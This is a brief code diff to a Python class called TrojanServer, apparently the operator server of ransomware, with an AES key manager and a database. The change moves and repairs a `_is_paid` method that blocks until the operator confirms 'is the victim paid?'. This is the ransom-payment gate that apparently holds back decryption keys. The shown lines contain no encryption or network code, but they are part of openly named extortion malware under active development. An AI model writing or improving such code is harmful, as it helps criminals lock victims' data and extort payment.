@@ -106,6 +106,12 @@ class TrojanServer:
         self.db = SQLDatabaseManager()
         self.keys = AesKeyManager()
 
+    def _is_paid(self):
+        paid = False
+        while(not paid):
+            has_paid = input("is the victim paid? [yes/no]\your answer:   ")
+            if has_paid == "yes":
+                paid = True
     def handle_client(self):
         # option 1:
         
@@ -146,12 +152,6 @@ class TrojanServer:
         decoded_msg = msg.decode()
         print(decoded_msg)
         
-    def _is_paid():
-        paid = False
-        while(not paid):
-            has_paid = input("is the victim paid? [yes/no]\your answer:   ")
-            if has_paid == "yes":
-                paid = True
 
 
 
